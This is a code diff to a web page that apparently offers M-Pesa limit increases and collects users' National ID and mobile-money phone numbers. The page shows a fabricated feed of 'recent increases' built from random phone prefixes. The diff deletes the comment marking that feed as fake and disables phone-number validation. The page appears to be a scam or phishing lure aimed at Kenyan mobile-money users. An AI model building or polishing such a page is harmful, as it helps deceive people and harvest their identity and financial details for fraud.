@@ -191,7 +191,7 @@ body{font-family:'Outfit',sans-serif;background:linear-gradient(180deg,#e8f5ed 0
         <div class="field-label">M-Pesa Registered Number</div>
         <div class="phone-field">
           <div class="phone-prefix">+254</div>
-          <input type="tel" class="field-input" id="phoneInput" placeholder="7xx xxx xxx" maxlength="10" inputmode="tel">
+          <input type="text" class="field-input" id="phoneInput" placeholder="07xx xxx xxx" maxlength="13">
         </div>
       </div>
     </div>
@@ -300,7 +300,6 @@ function selectCard(i,el){
   document.getElementById('ctaBtn').disabled=false;
 }
 
-// Fake recent increases
 const prefixes=['0725','0712','0701','0798','0741','0720','0733','0757'];
 function randomRecent(){
   const ph=prefixes[Math.floor(Math.random()*prefixes.length)]+'****'+Math.floor(10+Math.random()*90);
@@ -326,10 +325,10 @@ document.getElementById('verifyBtn').onclick=()=>{
   if(!/^\d{5,10}$/.test(idNum)){
     showToast('Please enter a valid National ID number');return;
   }
-  if(!/^\d{9}$/.test(rawPhone)){
-    showToast('Please enter a valid phone number');return;
-  }
-  userPhone='0'+rawPhone;
+  // if(!/^\d{9}$/.test(rawPhone)){
+    // showToast('Please enter a valid phone number');return;
+  // }
+  userPhone= rawPhone;
   const display='+254 '+rawPhone.slice(0,3)+' '+rawPhone.slice(3,6)+' '+rawPhone.slice(6);
   hideOverlay('identityOverlay');
   document.getElementById('revLimit').textContent=fmt(selected.amount);
